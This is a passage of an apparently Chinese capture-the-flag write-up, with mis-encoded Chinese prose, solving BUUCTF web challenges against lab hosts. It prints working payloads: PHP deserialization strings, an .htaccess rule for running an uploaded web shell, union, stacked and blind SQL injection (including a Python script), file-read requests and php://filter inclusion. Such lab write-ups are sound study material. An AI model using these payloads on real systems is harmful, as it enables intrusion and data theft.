</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>åªè¦è·Ÿè¿›readå‡½æ•°æ˜¯æ€ä¹ˆæ‰§è¡Œå°±è¡Œ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span>  $op<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span>  $filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;php://filter/read=convert.base64-encode/resource=flag.php&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span>  $content;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>FileHandler</span>();
</span></span><span style=display:flex><span>$exp <span style=color:#f92672>=</span><span style=color:#a6e22e>serialize</span>($exp);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $exp;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?str<span style=color:#f92672>=</span>O:11:<span style=color:#e6db74>&#34;FileHandler&#34;</span>:3:<span style=color:#f92672>{</span>S:5:<span style=color:#e6db74>&#34;\00\2A\00op&#34;</span>;i:2;S:11:<span style=color:#e6db74>&#34;\00\2A\00filename&#34;</span>;S:8:<span style=color:#e6db74>&#34;flag.php&#34;</span>;S:10:<span style=color:#e6db74>&#34;\00\2A\00content&#34;</span>;S:0:<span style=color:#e6db74>&#34;&#34;</span>;<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=gxyctf2019babyupload>[GXYCTF2019]BabyUpload</h2><p>æµ‹äº†ä¸€ä¸‹pngå¤´ä¹Ÿè¿‡æ»¤äº†æ”¹ä¸ªjpeg</p><pre tabindex=0><code class=language-htaccess data-lang=htaccess>&lt;FilesMatch &#34;shell.jpg&#34;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><pre tabindex=0><code>/upload/172f639b4017aae3ca276bdbf023400a/shell.jpg
</code></pre><p>ç”¨èšå‰‘è¿ä¸€ä¸‹å°±è¡Œ</p><h2 id=suctf-2019checkin>[SUCTF 2019]CheckIn</h2><p><code>.user.ini</code>çš„é©¬ä¸Šä¼ ï¼Œæ³¨æ„åŠ gif89ï¼Œç„¶åèšå‰‘è¿å°±è¡Œ</p><h2 id=gxyctf2019babysqli>[GXYCTF2019]BabySQli</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>&lt;!</span><span style=color:#75715e>--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>è§£å¯†</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>select</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>from</span> <span style=color:#66d9ef>user</span> <span style=color:#66d9ef>where</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;$name&#39;</span>
</span></span></code></pre></div><pre tabindex=0><code>name=1&#39; union select 1,2,3#&amp;pw=132
</code></pre><p>æºç é‡Œæœ‰</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>($arr[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>){
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>md5</span>($password) <span style=color:#f92672>==</span> $arr[<span style=color:#ae81ff>2</span>]){
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;wrong pass!&#34;</span>);
</span></span><span style=display:flex><span>			}
</span></span><span style=display:flex><span>		}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /search.php HTTP/1.1
</span></span><span style=display:flex><span>Host: dfed8b6d-8369-49fb-a3fb-c81035158302.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Origin: http://dfed8b6d-8369-49fb-a3fb-c81035158302.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Referer: http://dfed8b6d-8369-49fb-a3fb-c81035158302.node5.buuoj.cn:81/
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>13</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name<span style=color:#f92672>=</span>1<span style=color:#e6db74>&#39; union select 1,&#39;</span>admin<span style=color:#e6db74>&#39;,&#39;</span>e10adc3949ba59abbe56e057f20f883e<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#75715e>#&amp;pw=123456</span>
</span></span></code></pre></div><h2 id=gyctf2020blacklist>[GYCTF2020]Blacklist</h2><p>ä»¿çš„éšä¾¿æ³¨ï¼Œæ²¡ç»†çœ‹ç›´æ¥handlerçœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;show tables#
</span></span></span></code></pre></div><pre tabindex=0><code>FlagHere
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;;HANDLER `FlagHere` OPEN;HANDLER `FlagHere` READ FIRST;HANDLER `FlagHere` CLOSE;#
</span></span></span></code></pre></div><h2 id=ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>æµ‹ä¸€ä¸‹æœ‰waf,å‰ç«¯æµ‹ä¸€ä¼šbpçœ‹ä¸€ä¸‹wafå†™è„šæœ¬ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding:utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: 0raN9e</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Challenge: [CISCN 2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>blind_injection</span>(url):
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    printable_chars <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>printable
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> position <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>60</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> printable_chars:
</span></span><span style=display:flex><span>            payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;(select(ascii(mid(flag,</span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>,1))=</span><span style=color:#e6db74>{1}</span><span style=color:#e6db74>)from(flag))&#39;</span><span style=color:#f92672>.</span>format(position, ord(char))
</span></span><span style=display:flex><span>            post_data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;id&#34;</span>: payload}
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>                res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>url, data<span style=color:#f92672>=</span>post_data)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Hello&#39;</span> <span style=color:#f92672>in</span> res<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>                    flag <span style=color:#f92672>+=</span> char
</span></span><span style=display:flex><span>                    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Flag so far: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>RequestException <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Final flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://183220b5-e8ae-4f31-a048-8e409f5ea1b3.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span style=display:flex><span>    blind_injection(url)
</span></span></code></pre></div><p>è„šæœ¬è¿˜æ˜¯è¦ç»ƒçš„ã€‚</p><h2 id=roarctf-2019easy-java>[RoarCTF 2019]Easy Java</h2><p>WEB-INFæ˜¯javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.WEB-INF/web.xml
</span></span><span style=display:flex><span>webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚
</span></span><span style=display:flex><span>2.WEB-INF/classes
</span></span><span style=display:flex><span>åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„classæ–‡ä»¶ï¼ŒåŒ…æ‹¬servlet classå’Œéservlet class
</span></span><span style=display:flex><span>3.WEB-INF/lib
</span></span><span style=display:flex><span>å­˜æ”¾webåº”ç”¨éœ€è¦çš„JARæ–‡ä»¶
</span></span><span style=display:flex><span>4.WEB-INF/src
</span></span><span style=display:flex><span>æºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶
</span></span><span style=display:flex><span>5.WEB-INF/database.properties
</span></span><span style=display:flex><span>æ•°æ®åº“é…ç½®æ–‡ä»¶
</span></span><span style=display:flex><span>6.WEB-INF/tags
</span></span><span style=display:flex><span>å­˜æ”¾äº†è‡ªå®šä¹‰æ ‡ç­¾æ–‡ä»¶
</span></span><span style=display:flex><span>7.WEB-INF/jsp
</span></span><span style=display:flex><span>jsp 1.2 ä¸€ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶å­˜æ”¾ä½ç½®ã€‚
</span></span><span style=display:flex><span>8.WEB-INF/jsp2
</span></span><span style=display:flex><span>å­˜æ”¾jsp2.0ä»¥ä¸‹ç‰ˆæœ¬çš„æ–‡ä»¶ã€‚
</span></span><span style=display:flex><span>9.META-INF
</span></span><span style=display:flex><span>ç›¸å½“äºä¸€ä¸ªä¿¡æ¯åŒ…
</span></span></code></pre></div><p><code>WEB-INF/web.xml</code> æ˜¯ Java Web åº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ªé‡è¦é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºå®šä¹‰ Servletã€è¿‡æ»¤å™¨ã€ç›‘å¬å™¨ã€ä¸Šä¸‹æ–‡å‚æ•°ç­‰ã€‚å®ƒä½äº <code>WEB-INF</code> ç›®å½•ä¸‹ï¼Œæ˜¯ Java EEï¼ˆç° Jakarta EEï¼‰åº”ç”¨ç¨‹åºçš„æ ‡å‡†éƒ¨ç½²æè¿°æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬åœ¨ç‚¹helpå¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œä½†æ˜¯getä¼ å‚ä¸è¡Œï¼Œ ç”¨postå‘åŒ…</p><pre tabindex=0><code>POST /Download HTTP/1.1
Host: a349ce3f-344c-4e08-8542-f70cdd3d18bc.node5.buuoj.cn:81
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=A74D21610CC84D499908238CC3027647
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
referer: http://a349ce3f-344c-4e08-8542-f70cdd3d18bc.node5.buuoj.cn:81/Login
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

filename=WEB-INF/web.xml
</code></pre><p>å¾—åˆ°</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>    <span style=color:#f92672>&lt;servlet&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;servlet-name&gt;</span>FlagController<span style=color:#f92672>&lt;/servlet-name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;servlet-class&gt;</span>com.wm.ctf.FlagController<span style=color:#f92672>&lt;/servlet-class&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/servlet&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;servlet-mapping&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;servlet-name&gt;</span>FlagController<span style=color:#f92672>&lt;/servlet-name&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;url-pattern&gt;</span>/Flag<span style=color:#f92672>&lt;/url-pattern&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/servlet-mapping&gt;</span>
</span></span></code></pre></div><p>å°è¯•è¯»å–</p><pre tabindex=0><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class
</code></pre><pre tabindex=0><code class=language-xm data-lang=xm>&lt;ZmxhZ3s2ZGQyYmI3Ni00ZTlkLTQxODEtODljMC1hZTFlYTBiN2Y4ZDJ9Cg=
</code></pre><p>è§£å¯†å°±è¡Œ</p><h2 id=ç½‘é¼æ¯-2018fakebook>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>å‰ç«¯æ²¡ä¸œè¥¿ï¼Œå°è¯•çœ‹ä¸€ä¸‹</p><pre tabindex=0><code>http://93707d85-3eb1-4fce-b716-6b619443f821.node5.buuoj.cn:81/robots.txt
User-agent: *
Disallow: /user.php.bak
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>UserInfo</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $age <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $blog <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($name, $age, $blog)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>=</span> $name;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>age</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>int</span>)$age;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>blog</span> <span style=color:#f92672>=</span> $blog;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>($url)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $ch <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_init</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_setopt</span>($ch, <span style=color:#a6e22e>CURLOPT_URL</span>, $url);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_setopt</span>($ch, <span style=color:#a6e22e>CURLOPT_RETURNTRANSFER</span>, <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>        $output <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_exec</span>($ch);
</span></span><span style=display:flex><span>        $httpCode <span style=color:#f92672>=</span> <span style=color:#a6e22e>curl_getinfo</span>($ch, <span style=color:#a6e22e>CURLINFO_HTTP_CODE</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($httpCode <span style=color:#f92672>==</span> <span style=color:#ae81ff>404</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>404</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>curl_close</span>($ch);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $output;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getBlogContents</span> ()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>blog</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>isValidBlog</span> ()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $blog <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>blog</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&#34;</span>, $blog);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><pre tabindex=0><code>123 123 12 123.blogå¯ä»¥ç™»å½•
</code></pre><p><code>URL</code> è¯·æ±‚çš„ URL æœªç»è¿‡æ»¤æˆ–éªŒè¯ï¼Œå¯èƒ½å¯¼è‡´ SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>/</span><span style=color:#66d9ef>view</span>.php<span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;
</span></span></span></code></pre></div><p>å‘ç°æœ‰sqlæ³¨å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>and</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>order</span> <span style=color:#66d9ef>by</span> <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>order</span> <span style=color:#66d9ef>by</span> <span style=color:#ae81ff>4</span>
</span></span></code></pre></div><h3 id=è§£é¢˜1-4>è§£é¢˜1</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>Union</span><span style=color:#75715e>/**/</span><span style=color:#66d9ef>Select</span> <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span><span style=color:#75715e>--+
</span></span></span></code></pre></div><pre tabindex=0><code>?no=-1 Union/**/Select 1,database(),3,4--+
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>Union</span><span style=color:#75715e>/**/</span><span style=color:#66d9ef>Select</span> <span style=color:#ae81ff>1</span>,group_concat(<span style=color:#66d9ef>table_name</span>),<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span> <span style=color:#66d9ef>from</span> information_schema.tables <span style=color:#66d9ef>where</span> table_schema<span style=color:#f92672>=</span><span style=color:#66d9ef>database</span>()<span style=color:#75715e>--+
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>Union</span><span style=color:#75715e>/**/</span><span style=color:#66d9ef>Select</span> <span style=color:#ae81ff>1</span>,group_concat(<span style=color:#66d9ef>column_name</span>),<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span> <span style=color:#66d9ef>from</span> information_schema.columns <span style=color:#66d9ef>where</span> <span style=color:#66d9ef>table_name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;users&#39;</span><span style=color:#75715e>--+
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>Union</span><span style=color:#75715e>/**/</span><span style=color:#66d9ef>Select</span> <span style=color:#ae81ff>1</span>,<span style=color:#66d9ef>data</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span> <span style=color:#66d9ef>from</span> users<span style=color:#75715e>--+
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span><span style=color:#75715e>/**/</span><span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>3</span>,<span style=color:#e6db74>&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:3:&#34;123&#34;;s:3:&#34;age&#34;;i:12;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</span>
</span></span></code></pre></div><p>å¾—åˆ°ç„¶åbase64è§£å¯†</p><h3 id=è§£é¢˜2-4>è§£é¢˜2</h3><p>å¯ä»¥å‘ç°æ˜¯rootç”¨æˆ·åˆ©ç”¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#66d9ef>no</span><span style=color:#f92672>=-</span><span style=color:#ae81ff>1</span> <span style=color:#66d9ef>union</span><span style=color:#75715e>/**/</span><span style=color:#66d9ef>select</span> <span style=color:#ae81ff>1</span>,load_file(<span style=color:#e6db74>&#34;/var/www/html/flag.php&#34;</span>),<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>4</span><span style=color:#75715e>--+
</span></span></span></code></pre></div><p>æœ‰ç‚¹é—å¿˜äº†ï¼Œæ³¨å…¥ä¹Ÿä¸å¤ªç¬¦åˆå¸¸è§„çš„æ³¨å…¥ï¼Œå¼•å·éƒ½ä¸éœ€è¦</p><h2 id=bsidescf-2020had-a-bad-day>[BSidesCF 2020]Had a bad day</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://8c9c7563-317a-447e-a45f-9dbb7bb6613c.node5.buuoj.cn:81/index.php?category<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>index.php
</span></span></code></pre></div><p>å»æ‰php</p><p>ç„¶åè§£å¯†</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>				$file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;category&#39;</span>];
